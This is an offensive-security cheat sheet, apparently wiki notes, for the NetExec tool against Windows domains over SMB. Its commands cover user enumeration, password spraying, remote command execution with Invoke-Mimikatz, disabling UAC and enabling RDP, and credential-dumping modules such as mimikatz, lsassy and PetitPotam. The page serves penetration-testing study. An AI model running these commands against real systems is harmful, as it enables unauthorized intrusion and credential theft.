# 🕷️ NetExec

## 📚 Resource

- [netexec.wiki](https://www.netexec.wiki/)

## 🎯 Basic Usage

```bash
nxc <proto> $TARGET
nxc <proto> 192.168.1.10-20
nxc <proto> $SUBNET/$MASK
nxc <proto> targets.txt
```

## 🔍 Enumeration

```bash
# List users (anonymous or with credentials)
nxc smb $TARGET -u '' -p '' --users
```

### Auth required (Examples)

```bash
nxc smb $TARGET -u $USER -p $PASSWORD --groups
```

:::details SMB Enumeration Flags

| Option             | Description                                     |
| ------------------ | ----------------------------------------------- |
| `--users`          | List domain users                               |
| `--groups`         | List domain groups                              |
| `--shares`         | List accessible SMB shares                      |
| `--sessions`       | Check active sessions on target                 |
| `--local-admins`   | Find local administrators (requires privileges) |
| `--loggedon-users` | List users logged onto the machine              |
| `--pass-pol`       | Display domain password policy                  |
| `--rid-brute`      | RID brute force to enumerate users              |

:::

## Credential Testing

```bash
# Validate a single credential - (Pwn3d!) means the account is local admin
nxc smb $TARGET -u $USER -p $PASSWORD

# Password spraying with lists
nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success
```

> Authenticating with an NT hash (`-H`) is [pass-the-hash](/active-directory/kerberos/pass-the-hash.md).

## Execution

```bash
# Execute command remotely (default: WMI)
nxc smb $TARGET -u $USER -p $PASSWORD -x 'whoami'

# Specify execution method
nxc smb $TARGET -u $USER -p $PASSWORD --exec-method smbexec -x 'whoami'

# PowerShell command
nxc smb $TARGET -u $USER -p $PASSWORD -X '$PSVersionTable'

# Run a script or payload
nxc smb $TARGET -u $USER -p $PASSWORD -x 'powershell -nop -c "Invoke-Mimikatz"'
```

## 🛠️ Post-Exploitation

Dumping secrets over SMB with nxc (`--sam`, `--lsa`, `--ntds`) is covered in
[credential dumping](/active-directory/credential-dumping/).

```bash
# Remote host configuration (requires admin on the target)
nxc smb $TARGET -u $USER -p $PASSWORD --enable-rdp       # enable Remote Desktop
nxc smb $TARGET -u $USER -p $PASSWORD --disable-uac      # disable UAC remote restrictions
```

## 🧩 Modules

```bash
# Listing modules
nxc smb $TARGET -u $USER -p $PASSWORD -L

# Use modules
nxc smb $TARGET -u $USER -p $PASSWORD -M mimikatz
nxc smb $TARGET -u $USER -p $PASSWORD -M lsassy
nxc smb $TARGET -u $USER -p $PASSWORD -M petitpotam
nxc smb $TARGET -u $USER -p $PASSWORD -M coerce

# Module with options
nxc smb $TARGET -u $USER -p $PASSWORD -M spider_plus -o DOWNLOAD_FLAG=False
```

## MISC

```bash
# Check domain controller info
nxc smb $TARGET -u $USER -p $PASSWORD --dc

# Query domain users and info
nxc smb $TARGET -u $USER -p $PASSWORD --pass-pol

# List logged on users on remote host
nxc smb $TARGET -u $USER -p $PASSWORD --loggedon-users
```
